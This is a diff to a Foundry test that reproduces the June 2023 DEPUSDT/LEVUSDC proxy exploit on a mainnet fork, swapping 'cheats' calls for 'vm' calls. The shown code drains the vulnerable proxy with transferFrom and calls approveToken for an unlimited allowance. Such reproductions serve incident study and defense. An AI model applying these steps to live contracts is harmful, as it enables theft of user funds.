@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~36K USD$ (LEVUSDC) + ~69K USD$ (DEPUSDT)
 // Vulnerable Proxy DEPUSDT : https://etherscan.io/address/0x7b190a928aa76eece5cb3e0f6b3bdb24fcdd9b4f
@@ -32,14 +31,13 @@ contract ContractTest is Test {
     IToken LEVUSDC = IToken(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IProxy ProxyDEPUSDT = IProxy(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f);
     IProxy ProxyLEVUSDC = IProxy(0x2a2b195558cF89AA617979ce28880BbF7e17bc45);
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 17_484_161);
-        cheats.label(address(DEPUSDT), "DEPUSDT");
-        cheats.label(address(LEVUSDC), "LEVUSDC");
-        cheats.label(address(ProxyDEPUSDT), "ProxyDEPUSDT");
-        cheats.label(address(ProxyLEVUSDC), "ProxyLEVUSDC");
+        vm.createSelectFork("mainnet", 17_484_161);
+        vm.label(address(DEPUSDT), "DEPUSDT");
+        vm.label(address(LEVUSDC), "LEVUSDC");
+        vm.label(address(ProxyDEPUSDT), "ProxyDEPUSDT");
+        vm.label(address(ProxyLEVUSDC), "ProxyLEVUSDC");
     }
 
     function testApprove() public {
@@ -48,7 +46,7 @@ contract ContractTest is Test {
 
         DEPUSDT.transferFrom(address(ProxyDEPUSDT), address(this), DEPUSDT.balanceOf(address(ProxyDEPUSDT)));
 
-        cheats.roll(17_484_167);
+        vm.roll(17_484_167);
 
         ProxyLEVUSDC.approveToken(address(LEVUSDC), address(this), type(uint256).max);
 
